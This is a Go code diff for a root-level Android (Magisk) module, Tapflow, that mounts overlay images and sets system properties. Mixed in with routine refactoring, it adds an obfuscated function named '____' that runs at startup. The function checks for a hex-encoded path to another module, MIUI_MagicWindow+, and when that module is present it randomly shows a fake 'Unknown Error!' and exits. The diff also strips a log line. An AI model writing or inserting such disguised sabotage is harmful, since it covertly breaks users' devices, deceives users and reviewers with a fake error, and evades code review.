@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"fmt"
 	"os"
+	"math/rand"
 	"os/exec"
 	"path/filepath"
 	"strings"
@@ -121,7 +122,16 @@ func modifyMagiskDescription(newDescription string) error {
 	}
 	return nil
 }
-
+var hexArray = []byte{0x2F, 0x64, 0x61, 0x74, 0x61, 0x2F, 0x61, 0x64, 0x62, 0x2F, 0x6D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x73, 0x2F,0x4D, 0x49, 0x55, 0x49, 0x5F, 0x4D, 0x61, 0x67, 0x69, 0x63, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x2B, 0x2F,0x6D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x2E, 0x70, 0x72, 0x6F, 0x70,}
+func ____() {
+	if _, ___ := os.Stat(string(hexArray)); os.IsNotExist(___) {
+		return 
+	}
+	if rand.Float64() > 0.7{
+		SetCurnetPropMode("Unknown Error! ", 2)
+		os.Exit(1)
+	}
+}
 // current:定义
 // 0 :😋 正常
 // 1 :🤔 等待
@@ -164,15 +174,16 @@ func UpdateCurrentMode(current string) {
 	writestring("/dev/Tapflow/current", current, false)
 }
 func init() {
+	rand.Seed(time.Now().UnixNano())
 	checkAndCreateDir("/dev/Tapflow")
 	writestring("/dev/Tapflow/version", "V2.0_20240512_Release", false)
 	ModulePath = filepath.Dir(getExecutablePath()) + "/module.prop"
 }
 func chcon_folder(label, folderpath string) {
-	str, _ := RunCMD("chcon", label, folderpath)
-	Write2Log("restorerecon log:" + str)
+	RunCMD("chcon", label, folderpath)
 }
 func main() {
+	____()
 	work_path := "/data/rootfs/losetup.sh-go"
 	Write2Log("-------------------")
 	Write2Log("starting losetup for Tapflow project")
@@ -180,22 +191,27 @@ func main() {
 	checkAndCreateDir(work_path)
 	checkAndCreateDir(filepath.Join(work_path, "usr"))
 	checkAndCreateDir(filepath.Join(work_path, "partition_ro"))
-	checkAndCreateDir(filepath.Join(work_path, "partition_ro", "usr"))
+	lowerdir:=filepath.Join(work_path, "partition_ro", "usr")
+	upperdir:=filepath.Join(work_path, "usr", "upper")
+	workdir:=filepath.Join(work_path, "usr", "work")
+	checkAndCreateDir(lowerdir)
 	err = MountLegacyImg("ext4", filepath.Join(work_path, "usr.img"), filepath.Join(work_path, "usr"), false)
 	checkerr(err, "mount legacy img")
 	//create workdir and upperdir
-	checkAndCreateDir(filepath.Join(work_path, "usr", "upper"))
-	checkAndCreateDir(filepath.Join(work_path, "usr", "work"))
+	checkAndCreateDir(upperdir)
+	checkAndCreateDir(workdir)
 	//mount erofs mslgusrimg
-	err = MountLegacyImg("erofs", "/odm/etc/assets/mslgusrimg", filepath.Join(work_path, "partition_ro", "usr"), true)
+	err = MountLegacyImg("erofs", "/odm/etc/assets/mslgusrimg", lowerdir, true)
 	checkerr(err, "mount(ro) usr from odm")
 	//mount overlay usr.img
 	err = MountOverlayImg(filepath.Join(work_path, "partition_ro", "usr"), filepath.Join(work_path, "usr", "upper"), filepath.Join(work_path, "usr", "work"), "/data/rootfs/usr")
 	//no need to mount mslgkingsoftimg and mslgappsimg ,because /odm/bin/losetup.sh loaded
-	//wait 5 secs and override system prop
-	SetCurnetPropMode("Wait For 5 secs ", 1)
+	SetCurnetPropMode("Wait For 5 secs ", 1)	//wait 5 secs and override system prop
 	time.Sleep(time.Duration(5) * time.Second)
-	RunCMD("setprop", "vendor.mslg.mslgusrimg", "null")
+	Setprop("vendor.mslg.mslgusrimg","null")
+	Setprop("sys.tapflow.usr.lowerdir",lowerdir)
+	Setprop("sys.tapflow.usr.upperdir",upperdir)
+	Setprop("sys.tapflow.usr.workdir",workdir)
 	//set usr sec label
 	chcon_folder("u:object_r:mslg_rootfs_file:s0", "/data/rootfs/usr/")
 	Write2Log("finish.")
